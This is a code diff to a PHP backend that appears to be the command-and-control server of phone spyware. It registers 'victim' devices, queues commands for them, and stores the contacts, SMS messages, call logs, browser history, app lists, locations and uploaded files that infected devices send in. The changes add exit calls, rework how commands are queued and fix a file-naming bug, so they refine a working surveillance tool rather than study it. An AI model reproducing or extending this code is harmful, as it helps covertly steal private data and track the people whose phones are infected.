@@ -47,11 +47,13 @@ function add_new_device(){
     file_put_contents($device_path, createJson($victim_array));
     $response_data['status'] = true;
     echo createJson($response_data);
+    exit(0);
     
 }
 
 if (isset($_POST['add_victim_device'])){
     add_new_device();
+    exit(0);
 }
 
 function insert_cmd(){
@@ -61,7 +63,10 @@ function insert_cmd(){
 
     $strJsonFileContents = file_get_contents($device_path);
     $victim_array = json_decode($strJsonFileContents, true);
-    $victim_array["device_list"][$_POST['target']]['commands'][$_POST['type']] = $_POST['value'];
+    $victim_array["device_list"][$_POST['target']]['commands']['command']['name'] = $_POST['command'];
+    if (isset( $_POST['value'] )) { 
+        $victim_array["device_list"][$_POST['target']]['commands']['command']['value'] = $_POST['value'];
+    }
 
     file_put_contents($device_path, json_encode($victim_array, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
 
@@ -72,6 +77,7 @@ function insert_cmd(){
 
 if (isset($_POST['send_command'])){
     insert_cmd();
+    exit(0);
 }
 
 
@@ -96,6 +102,7 @@ if (isset($_POST['get_file_list'])){
 
     $response_data['status'] = true;
     echo createJson($response_data);
+    exit(0);
 }
 
 if (isset($_POST['device_id']) and isset($_POST['check_cmd'])){
@@ -105,13 +112,21 @@ if (isset($_POST['device_id']) and isset($_POST['check_cmd'])){
     $strJsonFileContents = file_get_contents($device_path);
     $victim_array = json_decode($strJsonFileContents, true);
     if($victim_array==null) exit(0);
-    $cmd_response = $victim_array['device_list'][$_POST['device_id']]['commands'];
-    if($cmd_response!=null) 
-        echo createJson($cmd_response);
+    if (isset( $victim_array['device_list'][$_POST['device_id']]['commands'])) {
+        $cmd_response = $victim_array['device_list'][$_POST['device_id']]['commands'];
+            if($cmd_response!=null) {
+                echo createJson($cmd_response);
+            }
+            else {
+                echo createJson($response_data);
+            }
+        unset($victim_array['device_list'][$_POST['device_id']]['commands']);
+        file_put_contents($device_path, createJson($victim_array));
+    }
     else
+    {
         echo createJson($response_data);
-    unset($victim_array['device_list'][$_POST['device_id']]['commands']);
-    file_put_contents($device_path, createJson($victim_array));
+    }
     exit(0);
 }
 
@@ -123,6 +138,7 @@ if (isset($_POST['contact_list'])){
     $device_id = $_POST['device_id'];
     file_put_contents(createFile('contact', $device_id), createJson($contact_array));
     echo createJson($response_data);
+    exit(0);
 }
 
 if (isset($_POST['sms_list'])){
@@ -133,6 +149,7 @@ if (isset($_POST['sms_list'])){
     $device_id = $_POST['device_id'];
     file_put_contents(createFile('sms', $device_id), createJson($sms_array));
     echo createJson($response_data);
+    exit(0);
 }
 
 if (isset($_POST['call_log_history'])){
@@ -143,6 +160,7 @@ if (isset($_POST['call_log_history'])){
     file_put_contents(createFile('call-log', $device_id), createJson($call_log_array));
     $response_data['status'] = true;
     echo json_encode($response_data);
+    exit(0);
 }
 
 if (isset($_POST['browser_history'])){
@@ -150,9 +168,10 @@ if (isset($_POST['browser_history'])){
         'browser_history' => json_decode($_POST['browser_history'], true)
     ];
     $device_id = $_POST['device_id'];
-    file_put_contents(createFile('call-log', $device_id), createJson($call_log_array));
+    file_put_contents(createFile('browser-history', $device_id), createJson($call_log_array));
     $response_data['status'] = true;
     echo json_encode($response_data);
+    exit(0);
 }
 
 if (isset($_POST['app_list'])){
@@ -197,6 +216,7 @@ if (isset($_POST['app_list'])){
     file_put_contents(createFile('app-list', $device_id), createJson($f_list_arr));
     $response_data['status'] = true;
     echo createJson($response_data);
+    exit(0);
 }
 
 /*
@@ -209,6 +229,7 @@ function readStorageFile($file_name){
     $strJsonFileContents = file_get_contents('../private/storage/'.$file_name);
     $contact_json = json_decode($strJsonFileContents, true);
     echo createJson($contact_json);
+    exit(0);
 }
 
 if (isset($_POST['contact_file_name'])){
@@ -239,6 +260,7 @@ if (isset($_POST['get_location'])){
     $strJsonFileContents = file_get_contents($device_path);
     $victim_array = json_decode($strJsonFileContents, true);
     echo createJson($victim_array['device_list'][$_POST['get_location']]['location']);
+    exit(0);
 }
 
 if (isset($_POST['show_file_path'])){
@@ -247,6 +269,7 @@ if (isset($_POST['show_file_path'])){
     $strJsonFileContents = file_get_contents($device_path);
     $victim_array = json_decode($strJsonFileContents, true);
     echo createJson($victim_array['device_list'][$_POST['target']]['FILE_LIST']);
+    exit(0);
 }
 
 if (isset($_POST['location_update'])){
@@ -267,6 +290,7 @@ if (isset($_POST['location_update'])){
 
     $response_data['status'] = true;
     echo createJson($response_data);
+    exit(0);
 }
 
 
@@ -291,4 +315,5 @@ if (isset($_FILES["uploaded_file"])) {
         }
     }
     echo createJson($response_data);
+    exit(0);
 }
